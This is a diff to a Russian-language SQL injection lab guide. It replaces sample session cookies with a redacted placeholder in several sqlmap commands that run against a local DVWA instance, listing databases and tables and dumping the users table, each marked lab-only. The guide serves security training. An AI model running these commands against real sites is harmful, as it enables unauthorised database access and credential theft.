@@ -186,7 +186,7 @@ Kali ARM64 VM используется как углубление, когда �
 2. Войдите под admin/password
 3. Откройте DevTools (F12) → вкладка Network
 4. Обновите страницу, найдите запрос, скопируйте заголовок `Cookie`
-5. Cookie выглядит примерно так: `PHPSESSID=abc123; security=low`
+5. Cookie выглядит примерно так: `<redacted-demo-session>; security=low`; в evidence значение cookie не сохраняется.
 
 ### Базовое использование SQLMap
 
@@ -194,7 +194,7 @@ Kali ARM64 VM используется как углубление, когда �
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
 sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
+  --cookie "<redacted-demo-session>; security=low" \
   --batch
 ```
 
@@ -204,7 +204,7 @@ sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
 sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
+  --cookie "<redacted-demo-session>; security=low" \
   --dbs --batch
 ```
 
@@ -214,7 +214,7 @@ sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
 sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
+  --cookie "<redacted-demo-session>; security=low" \
   -D dvwa --tables --batch
 ```
 
@@ -224,7 +224,7 @@ sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
 sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
+  --cookie "<redacted-demo-session>; security=low" \
   -D dvwa -T users --columns --batch
 ```
 
@@ -234,7 +234,7 @@ sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
 sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
+  --cookie "<redacted-demo-session>; security=low" \
   -D dvwa -T users --dump --batch
 ```
 
@@ -247,7 +247,7 @@ sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
 sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
+  --cookie "<redacted-demo-session>; security=low" \
   --dbs --batch --proxy="http://127.0.0.1:8080"
 ```
 
@@ -317,7 +317,7 @@ sqlmap --version
 # Если cookie содержат спецсимволы, используйте одинарные кавычки
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
 sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1" \
-  --cookie 'PHPSESSID=abc123; security=low' \
+  --cookie '<redacted-demo-session>; security=low' \
   --batch
 ```
 
@@ -343,7 +343,7 @@ sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1" \
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
    sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli_blind/" \
      --data "id=1&Submit=Submit" \
-     --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
+     --cookie "<redacted-demo-session>; security=low" \
      --dbs --batch
    ```
    Опишите разницу между тестированием GET и POST параметров.
